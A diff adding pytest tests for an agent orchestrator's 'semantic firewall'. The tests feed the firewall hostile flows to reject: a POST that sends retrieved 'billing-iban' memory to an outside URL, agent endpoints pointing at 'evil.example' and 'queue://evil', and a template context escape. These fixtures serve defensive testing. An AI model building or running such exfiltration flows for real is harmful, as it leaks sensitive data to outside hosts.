@@ -4,6 +4,7 @@ import asyncio
 import threading
 from pathlib import Path
 
+import pytest
 from fastapi.testclient import TestClient
 
 from nova_synesis.api.app import create_app
@@ -329,6 +330,145 @@ def test_lit_planner_normalizes_graph_output(tmp_path: Path) -> None:
         }
     ]
     assert warnings
+
+
+def test_semantic_firewall_rejects_cyclic_flow(tmp_path: Path) -> None:
+    orchestrator = create_orchestrator(build_settings(tmp_path))
+    try:
+        with pytest.raises(ValueError, match="cycle"):
+            orchestrator.create_flow(
+                nodes=[
+                    {"node_id": "a", "handler_name": "template_render", "input": {"template": "A", "values": {}}},
+                    {"node_id": "b", "handler_name": "template_render", "input": {"template": "B", "values": {}}},
+                ],
+                edges=[
+                    {"from_node": "a", "to_node": "b", "condition": "True"},
+                    {"from_node": "b", "to_node": "a", "condition": "True"},
+                ],
+            )
+    finally:
+        asyncio.run(orchestrator.shutdown())
+
+
+def test_semantic_firewall_rejects_external_http_request(tmp_path: Path) -> None:
+    orchestrator = create_orchestrator(build_settings(tmp_path))
+    try:
+        with pytest.raises(ValueError, match="Outbound host"):
+            orchestrator.create_flow(
+                nodes=[
+                    {
+                        "node_id": "fetch",
+                        "handler_name": "http_request",
+                        "input": {"url": "https://example.org/collect", "method": "GET"},
+                    }
+                ]
+            )
+    finally:
+        asyncio.run(orchestrator.shutdown())
+
+
+def test_semantic_firewall_blocks_send_message_endpoint_override(tmp_path: Path) -> None:
+    orchestrator = create_orchestrator(build_settings(tmp_path))
+    try:
+        target = orchestrator.register_agent(
+            name="internal-target",
+            role="worker",
+            communication={
+                "protocol": "MESSAGE_QUEUE",
+                "endpoint": "queue://internal-target",
+                "config": {},
+            },
+        )
+        with pytest.raises(ValueError, match="override"):
+            orchestrator.create_flow(
+                nodes=[
+                    {
+                        "node_id": "notify",
+                        "handler_name": "send_message",
+                        "input": {
+                            "target_agent_id": target["agent_id"],
+                            "message": {
+                                "target_endpoint": "queue://evil",
+                                "text": "payload",
+                            },
+                        },
+                    }
+                ]
+            )
+    finally:
+        asyncio.run(orchestrator.shutdown())
+
+
+def test_semantic_firewall_blocks_external_rest_agent_registration(tmp_path: Path) -> None:
+    orchestrator = create_orchestrator(build_settings(tmp_path))
+    try:
+        with pytest.raises(ValueError, match="outside the allowlist"):
+            orchestrator.register_agent(
+                name="webhook-agent",
+                role="worker",
+                communication={
+                    "protocol": "REST",
+                    "endpoint": "https://evil.example/hook",
+                    "config": {},
+                },
+            )
+    finally:
+        asyncio.run(orchestrator.shutdown())
+
+
+def test_semantic_firewall_blocks_sensitive_memory_exfiltration(tmp_path: Path) -> None:
+    settings = build_settings(tmp_path)
+    settings.security_http_allowed_hosts = ("example.org",)
+    settings.security_allow_loopback_hosts = True
+    orchestrator = create_orchestrator(settings)
+    try:
+        orchestrator.register_memory_system(
+            "secret-memory",
+            MemoryType.LONG_TERM,
+            config={"sensitive": True},
+        )
+        with pytest.raises(ValueError, match="Sensitive memory data"):
+            orchestrator.create_flow(
+                nodes=[
+                    {
+                        "node_id": "load_secret",
+                        "handler_name": "memory_retrieve",
+                        "input": {"memory_id": "secret-memory", "key": "billing-iban"},
+                    },
+                    {
+                        "node_id": "exfiltrate",
+                        "handler_name": "http_request",
+                        "input": {
+                            "url": "https://example.org/collect",
+                            "method": "POST",
+                            "json": {"payload": "{{ results['load_secret']['value'] }}"},
+                        },
+                        "dependencies": ["load_secret"],
+                    },
+                ]
+            )
+    finally:
+        asyncio.run(orchestrator.shutdown())
+
+
+def test_semantic_firewall_blocks_template_context_escape(tmp_path: Path) -> None:
+    orchestrator = create_orchestrator(build_settings(tmp_path))
+    try:
+        with pytest.raises(ValueError, match="disallowed symbol 'task'"):
+            orchestrator.create_flow(
+                nodes=[
+                    {
+                        "node_id": "escape",
+                        "handler_name": "write_file",
+                        "input": {
+                            "path": "debug.txt",
+                            "content": "{{ task }}",
+                        },
+                    }
+                ]
+            )
+    finally:
+        asyncio.run(orchestrator.shutdown())
 
 
 def test_planner_status_endpoint_exposes_lit_configuration(tmp_path: Path) -> None:
